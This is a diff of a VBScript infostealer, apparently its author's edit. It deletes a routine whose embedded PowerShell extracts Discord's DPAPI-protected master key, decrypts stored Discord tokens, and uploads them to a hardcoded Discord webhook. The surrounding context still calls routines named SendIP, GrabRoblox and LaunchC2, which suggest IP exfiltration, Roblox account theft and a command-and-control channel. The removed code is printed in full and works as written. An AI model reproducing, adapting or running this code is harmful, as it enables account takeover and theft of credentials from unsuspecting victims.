@@ -11,7 +11,6 @@ WH = "https://discord.com/api/webhooks/1537058264217288857/_gDfWmViEwuCjdpTpeXyH
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-Call GrabDiscordTokens
 Call SendIP
 Call GrabRoblox
 Call LaunchC2
@@ -207,36 +206,6 @@ Function MkGuid()
     MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing
 End Function
 
-Sub GrabDiscordTokens()
-    Dim dcPS, dp, dout, dt
-    dcPS = "$eap='SilentlyContinue';$app=$env:APPDATA;$cl=@('discord','discordptb','discordcanary');$mk=$null;foreach($c in $cl){$ls=gp ""$app\$c\Local State"" -Name os_crypt -EA 0 2>$null;if(!$ls){continue};$txt=$ls|Out-String;if($txt -match 'encrypted_key""\s*:\s*""([^""]+)'){$mkb=[Convert]::FromBase64String($Matches[1]);$mk=[Security.Cryptography.ProtectedData]::Unprotect($mkb[5..($mkb.Length-1)],$null,0);break}};if(!$mk){Write-Output 'NOMASTER';exit};Write-Output ('MK:'+[Convert]::ToBase64String($mk));foreach($c in $cl){$ld=""$app\$c\Local Storage\leveldb"";if(!(Test-Path $ld)){continue};gci $ld *.ldb,*.log -EA 0|%{$txt=gc $_.FullName -Raw -EA 0;$m=[regex]::Matches($txt,'dQw4w9WgXcQ:[^\s""]+');foreach($x in $m){try{$enc=[Convert]::FromBase64String($x.Value.Split(':')[1]);$nonce=$enc[3..14];$ct=$enc[15..($enc.Length-17)];$tag=$enc[($enc.Length-16)..($enc.Length-1)];$aes=[Security.Cryptography.AesGcm]::new($mk);$pt=[byte[]]::new($ct.Length);$aes.Decrypt($nonce,$ct,$tag,$pt);$tok=[Text.Encoding]::UTF8.GetString($pt);if($tok -match '\w{24}\.\w{6}\.\w{27}'){Write-Output ('TKN:'+$c+':'+$tok)}}catch{}}}};Write-Output 'DONE'"
-    dp = TmpFile("dt.ps1")
-    dout = TmpFile("dt.txt")
-    WriteFile dp, dcPS
-    fso.DeleteFile dout, True
-    WmiRun "powershell -NoP -EP Bypass -File """ & dp & """ > """ & dout & """"
-    fso.DeleteFile dp, True
-    If fso.FileExists(dout) Then
-        If fso.GetFile(dout).Size > 5 Then
-            dt = ReadFile(dout)
-            fso.DeleteFile dout, True
-            If InStr(dt, "TKN:") > 0 Then
-                PostEmbed "Discord Tokens", "Decrypted tokens below", 16711680
-                PostFile "tokens.txt", dt
-            ElseIf InStr(dt, "MK:") > 0 Then
-                PostEmbed "Discord", "Found master key but no tokens", 16744192
-                Dim mkP: mkP = InStr(dt, "MK:")
-                If mkP > 0 Then
-                    Dim mkE2: mkE2 = InStr(mkP, dt, vbLf)
-                    If mkE2 = 0 Then mkE2 = Len(dt) + 1
-                    PostFile "master_key.txt", Mid(dt, mkP + 3, mkE2 - mkP - 3)
-                End If
-            Else
-                PostEmbed "Discord", "No Discord installation found", 10038562
-            End If
-        End If
-    End If
-End Sub
 
 Sub LaunchC2
     On Error Resume Next
